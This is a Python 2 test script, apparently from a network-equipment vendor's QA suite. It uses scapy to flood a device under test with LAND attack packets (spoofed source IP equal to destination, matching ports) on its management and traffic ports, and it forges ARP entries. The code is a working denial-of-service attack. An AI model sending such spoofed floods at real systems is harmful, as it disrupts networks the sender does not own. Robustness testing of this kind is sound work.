#!/usr/bin/python
#-*- coding: utf-8 -*-

#Filename: 100.2.py
#-----------------------------------------------------------------------------------
#Purpose: land
#
#
#Notes:
#History:
#        06/25/2013- Jefferson Sun,Created
#
#Copyright(c): Transition Networks, Inc.2013
#------------------------------------------------------------------------------------

from attack import *
from scapy.all import *
from PubModuleVitesse import PubReadConfig


def land(macsrc,ipsrc,ipdst,mgmtnic,trfcnic,num):
	AttackTest = AttackCases(ipdst)
	rndprt = random.randint(1,65535)
	try:
		print "First to Test management Port Attack"
		print "TTL not equal to 1"
		send(IP(src=ipdst,dst=ipdst)/TCP(sport=rndprt,dport=rndprt),count=num,iface=mgmtnic)
		AttackTest.ChkDutSts()
		print "TTL equal to 1"
		send(IP(src=ipdst,dst=ipdst,ttl=1)/TCP(sport=rndprt,dport=rndprt),count=num,iface=mgmtnic)
		AttackTest.ChkDutSts()
		print "Start Testing Traffic Port Attack"
		conf.route.add(host=ipdst,dev=trfcnic)
		print "forge arp packets in order to use traffic port to do testing"
		AttackTest.fgarp(macsrc,ipsrc,ipdst,trfcnic)
		send(IP(src=ipdst,dst=ipdst)/TCP(sport=rndprt,dport=rndprt),count=num,iface=trfcnic)
		conf.route.resync()
		AttackTest.ChkDutSts()
	except:
		print "FAIL"
		sys.exit()


if __name__=="__main__":
        prmts = PubReadConfig("")
	num = 100
	mgmtnic = prmts.GetParameter("PC","MGMTNIC")
        trfcnic = prmts.GetParameter("PC","TRFCNIC")
	ipsrc = "192.168.3.187"
	ipdst = prmts.GetParameter("DUT1","IP")
	macsrc = "00:27:19:9b:17:a5"
	print "==============Start Testing land=================="
	land(macsrc,ipsrc,ipdst,mgmtnic,trfcnic,num)
	print "==============land testing finished==============="
	print "PASS"
